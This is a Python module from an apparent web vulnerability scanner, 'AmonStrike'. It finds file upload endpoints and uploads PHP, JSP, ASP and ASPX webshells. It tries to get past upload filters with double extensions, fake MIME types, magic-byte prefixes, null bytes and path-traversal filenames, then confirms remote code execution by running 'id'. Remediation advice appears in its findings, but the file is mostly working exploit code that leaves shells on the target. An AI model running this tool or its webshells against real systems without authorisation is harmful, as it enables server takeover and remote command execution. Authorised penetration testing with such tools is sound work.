"""
AmonStrike — File Upload Module
Unrestricted file upload = direct path to webshell RCE.

Tests:
  1. Upload PHP/JSP/ASP webshell
  2. Bypass extension checks (.php.jpg, .php%00.jpg)
  3. Bypass MIME type checks (fake Content-Type)
  4. Double extension bypass
  5. Null byte injection
  6. Magic byte spoofing (GIF89a + PHP)
  7. Path traversal in filename
"""
import io
import re
import requests
from .base import BaseModule


class FileUploadModule(BaseModule):
    NAME        = "file_upload"
    DESCRIPTION = "File upload — webshell, extension bypass, MIME bypass"

    WEBSHELL_PHP  = b'<?php system($_GET["cmd"]); ?>'
    WEBSHELL_JSP  = b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
    WEBSHELL_ASP  = b'<% eval request("cmd") %>'
    WEBSHELL_ASPX = b'<%@ Page Language="C#"%><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd():"").ReadToEnd()%>'

    MAGIC_BYTES   = {
        "gif":  b"GIF89a",
        "jpg":  b"\xff\xd8\xff",
        "png":  b"\x89PNG\r\n\x1a\n",
        "pdf":  b"%PDF-",
    }

    def run(self):
        self.log("Testing file upload vulnerabilities...")
        upload_endpoints = self._find_upload_endpoints()
        self.info["upload_endpoints"] = upload_endpoints

        for ep in upload_endpoints:
            self._test_direct_php(ep)
            self._test_extension_bypass(ep)
            self._test_mime_bypass(ep)
            self._test_magic_byte_bypass(ep)
            self._test_null_byte(ep)
            self._test_path_traversal_filename(ep)

        self.log(f"File upload complete — {len(self.findings)} findings", "+")
        return self.result()

    def _find_upload_endpoints(self) -> list:
        """Discover file upload forms and API endpoints."""
        endpoints = []
        r = self.get("")
        if not r:
            return endpoints

        # Find form upload fields
        for form in self.extract_forms(r):
            if any("file" in str(v).lower() or "upload" in str(v).lower()
                   for v in form.get("inputs",{}).values()):
                endpoints.append({
                    "url":    self.url + (form.get("action","") or ""),
                    "method": form.get("method","post"),
                    "type":   "form",
                })

        # Check common upload API paths
        api_paths = [
            "/api/upload", "/upload", "/api/file", "/api/files",
            "/api/image", "/api/images", "/api/avatar", "/api/attachment",
            "/api/v1/upload", "/api/v1/files", "/media/upload",
        ]
        for path in api_paths:
            r2 = self.get(path)
            if r2 and r2.status_code not in [404, 405]:
                endpoints.append({"url": self.url + path, "method": "post", "type": "api"})

        return endpoints

    def _upload(self, endpoint: dict, filename: str, data: bytes,
                content_type: str = "application/octet-stream") -> requests.Response:
        """Upload a file to the endpoint."""
        try:
            files = {"file": (filename, io.BytesIO(data), content_type)}
            r = self.session.post(
                endpoint["url"], files=files, timeout=self.timeout, verify=False
            )
            return r
        except Exception:
            return None

    def _check_executed(self, response: requests.Response, upload_url: str = "") -> bool:
        """Check if the uploaded shell was executed."""
        if not response:
            return False
        # Look for upload path in response
        for pattern in [
            r'"url"\s*:\s*"([^"]+)"',
            r'"path"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'href="([^"]*\.php[^"]*)"',
        ]:
            m = re.search(pattern, response.text)
            if m:
                path = m.group(1)
                # Try to access with cmd parameter
                test_url = path if path.startswith("http") else self.url + path
                r2 = self.session.get(
                    test_url + "?cmd=id", timeout=5, verify=False
                )
                if r2 and "uid=" in r2.text:
                    return True, test_url, r2.text
        return False, "", ""

    def _test_direct_php(self, ep: dict):
        """Upload raw PHP webshell."""
        r = self._upload(ep, "shell.php", self.WEBSHELL_PHP, "application/x-php")
        if not r:
            return
        if r.status_code in [200, 201]:
            executed, shell_url, output = self._check_executed(r)
            if executed:
                self.add_finding(
                    title       = "RCE via Unrestricted File Upload — PHP Webshell Executed",
                    severity    = "CRITICAL",
                    description = (
                        "Direct PHP webshell upload succeeded and was executed by the server. "
                        "Full Remote Code Execution achieved. "
                        f"Shell accessible at: {shell_url}"
                    ),
                    evidence    = (
                        f"Upload endpoint: {ep['url']}\n"
                        f"Filename: shell.php\n"
                        f"Shell URL: {shell_url}\n"
                        f"Command 'id' output: {output[:200]}"
                    ),
                    remediation = (
                        "Restrict uploaded file types to a strict allowlist (images only). "
                        "Store uploads outside webroot. "
                        "Rename files server-side. "
                        "Use a CDN or separate domain for user content."
                    ),
                    url         = ep["url"],
                    cve         = "CWE-434",
                )
            else:
                self.add_finding(
                    title       = "PHP File Upload Accepted — Possible RCE",
                    severity    = "HIGH",
                    description = f"Server accepted PHP file upload at {ep['url']}. File may be executable.",
                    evidence    = f"Upload URL: {ep['url']}\nFilename: shell.php\nResponse: {r.text[:300]}",
                    remediation = "Block server-side script uploads. Validate file type by content, not extension.",
                    url         = ep["url"],
                    cve         = "CWE-434",
                )

    def _test_extension_bypass(self, ep: dict):
        """Test extension bypass techniques."""
        bypass_names = [
            "shell.php.jpg", "shell.php.png", "shell.phtml",
            "shell.pHp", "shell.PHP", "shell.php5", "shell.php7",
            "shell.phar", "shell.shtml", "shell.php%20",
        ]
        for name in bypass_names:
            r = self._upload(ep, name, self.WEBSHELL_PHP, "image/jpeg")
            if r and r.status_code in [200, 201]:
                executed, shell_url, output = self._check_executed(r)
                if executed:
                    self.add_finding(
                        title       = f"RCE — File Upload Extension Bypass: {name}",
                        severity    = "CRITICAL",
                        description = f"Extension bypass '{name}' uploaded and executed as PHP.",
                        evidence    = f"Bypass name: {name}\nShell: {shell_url}\nOutput: {output[:150]}",
                        remediation = "Use whitelist (not blacklist) for extensions. Validate by MIME type AND content.",
                        url         = ep["url"],
                        cve         = "CWE-434",
                    )
                    break

    def _test_mime_bypass(self, ep: dict):
        """Send PHP content with innocent MIME type."""
        r = self._upload(ep, "image.jpg", self.WEBSHELL_PHP, "image/jpeg")
        if r and r.status_code in [200, 201]:
            executed, shell_url, _ = self._check_executed(r)
            if executed:
                self.add_finding(
                    title       = "RCE — MIME Type Bypass File Upload",
                    severity    = "CRITICAL",
                    description = "PHP webshell uploaded with image/jpeg MIME type was executed.",
                    evidence    = f"Shell: {shell_url}",
                    remediation = "Validate file content with libmagic, not Content-Type header.",
                    url         = ep["url"],
                    cve         = "CWE-434",
                )

    def _test_magic_byte_bypass(self, ep: dict):
        """Prepend magic bytes to PHP shell (GIF89a + PHP)."""
        for fmt, magic in self.MAGIC_BYTES.items():
            payload = magic + b"\n" + self.WEBSHELL_PHP
            r = self._upload(ep, f"image.{fmt}", payload, f"image/{fmt}")
            if r and r.status_code in [200, 201]:
                executed, shell_url, output = self._check_executed(r)
                if executed:
                    self.add_finding(
                        title       = f"RCE — Magic Byte Bypass ({fmt.upper()} + PHP)",
                        severity    = "CRITICAL",
                        description = f"File prefixed with {fmt.upper()} magic bytes executed as PHP.",
                        evidence    = f"Magic: {magic.hex()[:12]}... + PHP code\nShell: {shell_url}",
                        remediation = "Use dedicated image processing libraries. Re-encode images server-side.",
                        url         = ep["url"],
                        cve         = "CWE-434",
                    )
                    break

    def _test_null_byte(self, ep: dict):
        """Null byte injection in filename."""
        for name in ["shell.php\x00.jpg", "shell.php%00.jpg"]:
            r = self._upload(ep, name, self.WEBSHELL_PHP, "image/jpeg")
            if r and r.status_code in [200, 201]:
                executed, shell_url, _ = self._check_executed(r)
                if executed:
                    self.add_finding(
                        title       = "RCE — Null Byte File Upload Bypass",
                        severity    = "CRITICAL",
                        description = f"Null byte in filename '{name}' caused PHP execution.",
                        evidence    = f"Shell: {shell_url}",
                        remediation = "Strip null bytes from filenames. Use language-native string functions.",
                        url         = ep["url"],
                        cve         = "CWE-434",
                    )
                    break

    def _test_path_traversal_filename(self, ep: dict):
        """Path traversal in uploaded filename."""
        traversal_names = [
            "../../../var/www/html/shell.php",
            "..%2F..%2Fshell.php",
            "....//....//shell.php",
        ]
        for name in traversal_names:
            r = self._upload(ep, name, self.WEBSHELL_PHP, "application/x-php")
            if r and r.status_code in [200, 201]:
                # Check if file landed outside upload dir
                r2 = self.session.get(self.url + "/shell.php?cmd=id",
                                      timeout=5, verify=False)
                if r2 and "uid=" in r2.text:
                    self.add_finding(
                        title       = "RCE — Path Traversal in Upload Filename",
                        severity    = "CRITICAL",
                        description = f"Path traversal in filename '{name}' placed webshell in webroot.",
                        evidence    = f"Shell at: {self.url}/shell.php\nOutput: {r2.text[:150]}",
                        remediation = "Sanitize filenames: strip path separators, use os.path.basename().",
                        url         = ep["url"],
                        cve         = "CWE-22",
                    )
                    break
